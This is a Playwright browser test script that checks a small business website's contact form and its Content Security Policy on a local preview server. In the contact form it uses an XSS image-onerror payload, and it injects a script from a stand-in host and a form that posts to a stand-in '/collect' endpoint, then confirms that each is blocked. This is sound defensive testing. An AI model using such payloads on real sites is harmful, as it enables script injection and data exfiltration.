/* Local security checks. Every external request is intercepted; no email,
 * provider activation, production login or real CAPTCHA submission occurs. */
const {chromium} = require('playwright');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const {createPreviewServer} = require('./site-preview-server.cjs');
const root = path.resolve(__dirname, '..');
const report = {layouts:[], blocked:[], form:[], failures:[]};
const output = process.env.SMF_SECURITY_REPORT || '/tmp/smf-site-security-browser.json';
(async () => {
  const server = createPreviewServer();
  await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
  const base = 'http://127.0.0.1:' + server.address().port;
  let browser;
  try {
    browser = await chromium.launch({executablePath:process.env.SMF_CHROMIUM_EXECUTABLE,
      args:['--no-sandbox','--disable-dev-shm-usage','--disable-gpu']});
    report.browser = browser.version();
    const context = await browser.newContext({viewport:{width:390,height:844}});
    const posts = [], external = [];
    await context.route('**/*', async route => {
      const request = route.request();
      const url = new URL(request.url());
      if (url.origin === base) return route.continue();
      if (url.hostname === 'formsubmit.co' && request.method() === 'POST') {
        posts.push({url:request.url(), body:request.postData()});
        return route.fulfill({status:200,contentType:'text/html',body:'<h1>Intercepted local form fixture</h1>'});
      }
      external.push(request.url());
      // The approved map can load its frame, without contacting Google.
      if (url.hostname === 'www.google.com') return route.fulfill({status:200,contentType:'text/html',body:'<p>Local map fixture</p>'});
      return route.abort();
    });
    await context.addInitScript(() => {
      if (self !== top) return;
      window.securityViolations = [];
      document.addEventListener('securitypolicyviolation', event => window.securityViolations.push({directive:event.effectiveDirective,blocked:event.blockedURI}));
    });
    const page = await context.newPage();
    const errors = [];
    page.on('pageerror', error => errors.push(error.message));
    for (const rule of require('../vercel.json').rewrites) {
      const widths = rule.source.match(/privacy|terms|shipping|disclaimer/) ? [390] : [390,1366];
      for (const width of widths) {
        await page.setViewportSize({width,height:900});
        const response = await page.goto(base + rule.source,{waitUntil:'domcontentloaded'});
        assert.equal(response.status(),200);
        assert(response.headers()['content-security-policy']);
        await page.evaluate(() => document.fonts.ready);
        const hasMotion = await page.locator('script[src*="site-motion.js"]').count();
        if (hasMotion) {
          await page.waitForFunction(() => document.documentElement.dataset.smfMotionState === 'complete');
          assert.equal(await page.locator('html').getAttribute('data-smf-motion-reason'),'complete');
        }
        if (rule.source === '/home/') {
          await page.waitForFunction(() => Number(document.querySelector('.smf-water-canvas')?.dataset.renderedFrames) >= 15);
          assert.equal(await page.locator('.smf-water-canvas').getAttribute('data-water-state'),'playing');
        }
        assert(await page.locator('h1').isVisible());
        assert(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth));
        await page.locator('.menu-toggle').click();
        assert.equal(await page.locator('.menu-toggle').getAttribute('aria-expanded'),'true');
        await page.keyboard.press('Escape');
        assert.equal(await page.locator('.menu-toggle').getAttribute('aria-expanded'),'false');
        const original = await page.locator('html').getAttribute('data-theme');
        await page.locator('[data-theme-toggle]').click();
        assert.notEqual(await page.locator('html').getAttribute('data-theme'),original);
        assert.deepEqual(await page.evaluate(() => window.securityViolations),[]);
        report.layouts.push({route:rule.source,width,motion:hasMotion ? 'complete' : 'not used'});
      }
    }
    await page.goto(base + '/contact/');
    const payload = '<img src=x onerror="window.messageInjected=true">';
    await page.locator('#inquiry-name').fill('Zoë O’Connor');
    await page.locator('#inquiry-email').fill('fixture@example.invalid');
    await page.locator('#inquiry-goals').fill('   ');
    await page.locator('#inquiry-form button').click();
    assert.equal(posts.length,0);
    assert.equal(await page.locator('#inquiry-goals').evaluate(field => field.checkValidity()),false);
    await page.locator('#inquiry-goals').fill('Can we discuss strength & mobility?\n' + payload);
    assert.equal(await page.evaluate(() => window.messageInjected),undefined);
    assert.equal(await page.locator('#inquiry-form img').count(),0);
    await page.locator('#inquiry-form button').click();
    await page.waitForURL('https://formsubmit.co/**');
    assert.equal(posts.length,1);
    const data = new URLSearchParams(posts[0].body);
    assert.equal(data.get('name'),'Zoë O’Connor');
    assert.equal(data.get('_captcha'),'true');
    assert.equal(data.get('_honey'),'');
    assert(data.get('goals').includes(payload));
    report.form.push('Whitespace rejected; Unicode and punctuation preserved; message stays data; valid POST intercepted once with CAPTCHA and empty honeypot.');
    await page.goto(base + '/contact/');
    await page.evaluate(() => {
      const script = document.createElement('script');
      script.textContent = 'window.inlineInjected=true'; document.body.append(script);
      const remote = document.createElement('script');
      remote.src = 'https://unapproved.example.invalid/inject.js'; document.body.append(remote);
      const button = document.createElement('button');
      button.setAttribute('onclick','window.handlerInjected=true'); document.body.append(button); button.click();
    });
    await page.waitForFunction(() => window.securityViolations.length >= 3);
    assert.equal(await page.evaluate(() => window.inlineInjected || window.handlerInjected),undefined);
    assert(!external.some(url => url.includes('unapproved.example.invalid')));
    report.blocked.push(...await page.evaluate(() => window.securityViolations));
    await page.evaluate(() => {
      const form = document.createElement('form');form.method='post';form.action='https://unapproved.example.invalid/collect';document.body.append(form);form.submit();
    });
    await page.waitForFunction(() => window.securityViolations.some(item => item.directive === 'form-action'));
    assert.equal(new URL(page.url()).origin,base);
    assert(!external.some(url => url.includes('unapproved.example.invalid')));
    report.blocked.push(...await page.evaluate(() => window.securityViolations.filter(item => item.directive === 'form-action')));
    assert.deepEqual(errors,[]);
    await context.close();
    const noJs = await browser.newContext({javaScriptEnabled:false});
    await noJs.route('**/*', route => new URL(route.request().url()).origin === base ? route.continue() : route.abort());
    const native = await noJs.newPage();await native.goto(base + '/contact/');
    assert.equal(await native.locator('input[name="_captcha"]').getAttribute('value'),'true');
    assert.equal(await native.locator('#inquiry-email').getAttribute('type'),'email');
    assert.equal(await native.locator('#inquiry-goals').getAttribute('maxlength'),'1500');
    assert(await native.locator('.menu-fallback summary').isVisible());
    report.form.push('Native required/email/length constraints and provider CAPTCHA configuration remain present with JavaScript disabled.');
    await noJs.close();
  } catch (error) {
    report.failures.push(error.stack || String(error));process.exitCode=1;
  } finally {
    if (browser) await browser.close();
    server.closeAllConnections();await new Promise(resolve => server.close(resolve));
    fs.mkdirSync(path.dirname(output),{recursive:true});fs.writeFileSync(output,JSON.stringify(report,null,2)+'\n');
    console.log(JSON.stringify({layouts:report.layouts.length,blocked:report.blocked.length,formChecks:report.form.length,failures:report.failures,output}));
  }
})();
